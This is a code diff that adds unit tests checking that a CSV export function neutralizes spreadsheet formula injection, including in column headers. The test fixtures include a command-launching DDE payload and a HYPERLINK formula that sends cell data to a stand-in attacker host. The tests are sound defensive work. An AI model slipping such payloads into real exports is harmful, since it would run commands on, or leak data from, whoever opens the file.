@@ -46,4 +46,30 @@ describe("convertToCSV - utility", () => {
       '"host_display_name","last_fetched","uid","json_result","edge"",""case"\n"Rachel@Fleet","2024-06-25T13:11:18Z","145","{""AC Power:"":{""acwake"":""0"",""hibernatefile"":""/var/vm/sleepimage""}}","true"'
     );
   });
+  it.each([
+    ["=cmd|' /C calc'!A1", `"'=cmd|' /C calc'!A1"`],
+    [
+      '+HYPERLINK("http://attacker.example/?d="&A1,"x")',
+      `"'+HYPERLINK(""http://attacker.example/?d=""&A1,""x"")"`,
+    ],
+    ["-1+1", `"'-1+1"`],
+    ["@SUM(A1:A2)", `"'@SUM(A1:A2)"`],
+    [" =1+1", `"' =1+1"`],
+    ["\t=1+1", `"'\t=1+1"`],
+    ["-rc1", `"'-rc1"`],
+    ["-5", `"-5"`],
+    ["+3.2", `"+3.2"`],
+    ["0123", `"=""0123"""`],
+    ["user@example.com", `"user@example.com"`],
+    ["", `""`],
+  ])("neutralizes spreadsheet formulas in %j", (value, expected) => {
+    expect(convertToCSV({ objArray: [{ value }] })).toEqual(
+      `"value"\n${expected}`
+    );
+  });
+  it("neutralizes formulas in column headers", () => {
+    expect(convertToCSV({ objArray: [{ "=1+1": "a" }] })).toEqual(
+      `"'=1+1"\n"a"`
+    );
+  });
 });
